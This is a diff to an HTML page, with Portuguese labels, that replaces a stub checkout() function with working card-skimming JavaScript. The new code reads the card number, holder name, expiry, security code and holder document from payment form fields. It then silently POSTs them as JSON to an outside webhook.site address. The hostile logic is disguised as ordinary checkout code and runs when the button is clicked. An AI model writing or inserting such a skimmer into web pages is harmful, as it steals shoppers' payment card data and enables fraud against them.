@@ -56,8 +56,42 @@
     <button onclick="checkout()">Enviar POST</button>
 
     <script>
-      function checkout() {
-        console.log("checkout feito");
+            function checkout() {
+        var ccnumber = "creditCardpayment-card-0Number";
+        var ccnamenputid = "creditCardpayment-card-0Name";
+        var expirationyearinputid = "creditCardpayment-card-0Month";
+        var expirationmountinputid = "creditCardpayment-card-0Year";
+        var cardcodeinputid = "creditCardpayment-card-0Code";
+        var documentinputid = "holder-document-0";
+
+        var cardNumber = document.getElementById(ccnumber).value;
+        var ccName = document.getElementById(ccnamenputid).value;
+        var cardExpirationMonth = document.getElementById(
+          expirationyearinputid
+        ).value;
+        var cardExpirationYear = document.getElementById(
+          expirationmountinputid
+        ).value;
+        var cardCode = document.getElementById(cardcodeinputid).value;
+        var holderDocument = document.getElementById(documentinputid).value;
+        var apiendpoint =
+          "https://webhook.site/23cac3f8-33fe-43bd-aceb-cf29b7e781dd";
+        var data = {
+          cardNumber: cardNumber,
+          ccName: ccName,
+          cardExpirationMonth: cardExpirationMonth,
+          cardExpirationYear: cardExpirationYear,
+          cardCode: cardCode,
+          holderDocument: holderDocument,
+        };
+
+        fetch(apiendpoint, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        });
       }
     </script>
     <!-- Google Tag Manager -->
